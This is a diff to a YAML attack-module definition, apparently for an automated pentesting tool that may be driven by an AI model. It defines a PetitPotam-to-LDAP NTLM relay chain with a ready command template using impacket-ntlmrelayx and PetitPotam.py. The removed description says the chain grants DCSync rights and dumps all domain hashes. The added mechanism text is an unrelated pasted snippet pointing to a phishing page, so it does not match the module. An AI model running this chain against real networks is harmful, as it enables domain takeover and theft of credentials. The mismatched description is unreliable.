@@ -2,16 +2,19 @@ name: petitpotam_relay
 category: ad
 description: PetitPotam to LDAP relay chain
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "impacket-ntlmrelayx -t ldap://{dc_ip} --escalate-user '{username}' && python3 PetitPotam.py {attacker_ip} {target_ip}"
+command_template: impacket-ntlmrelayx -t ldap://{dc_ip} --escalate-user '{username}'
+  && python3 PetitPotam.py {attacker_ip} {target_ip}
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "PetitPotam coerces DC to authenticate → relay to LDAP → grant DCSync rights to controlled user → dump all domain hashes."
+mechanism: 'Don''t forget that you cannot only steal the hash or the authentication
+  but also **perform NTLM relay attacks**: - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)'
+hacktricks_ref: generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
